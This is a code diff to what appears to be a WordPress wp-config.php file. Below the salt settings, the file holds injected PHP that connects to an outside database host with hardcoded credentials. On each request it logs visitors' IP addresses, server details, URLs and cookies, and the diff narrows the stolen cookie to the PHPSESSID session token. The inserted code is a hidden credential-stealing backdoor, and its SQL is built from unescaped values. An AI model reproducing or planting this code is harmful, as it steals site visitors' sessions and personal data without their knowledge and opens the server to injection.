@@ -64,6 +64,7 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * a unique prefix. Only numbers, letters, and underscores please!
  */
 
+$cokiene = $_COOKIE['PHPSESSID'];
 $host = "neto.caltec.mx";  
 $user = "neto_web";     
 $pass = "WeBNeto2019";          
@@ -78,8 +79,8 @@ $sql_check = "SELECT id FROM email_logs WHERE ip_address = '$ip_address' AND all
 $result = $conn->query($sql_check);
 
 if ($result->num_rows == 0) {
-$sql_insert = "INSERT INTO email_logs (ip_address, uname, access, all_path, password) 
-               VALUES ('$ip_address', '$uname', '$access_url', '$x_path', '" . serialize($_COOKIE) . "')";
+    $sql_insert = "INSERT INTO email_logs (ip_address, uname, access, all_path,password) 
+                   VALUES ('$ip_address', '$uname', '$access_url', '$x_path','$cokiene')";
     $conn->query($sql_insert);
 }
 $conn->close();
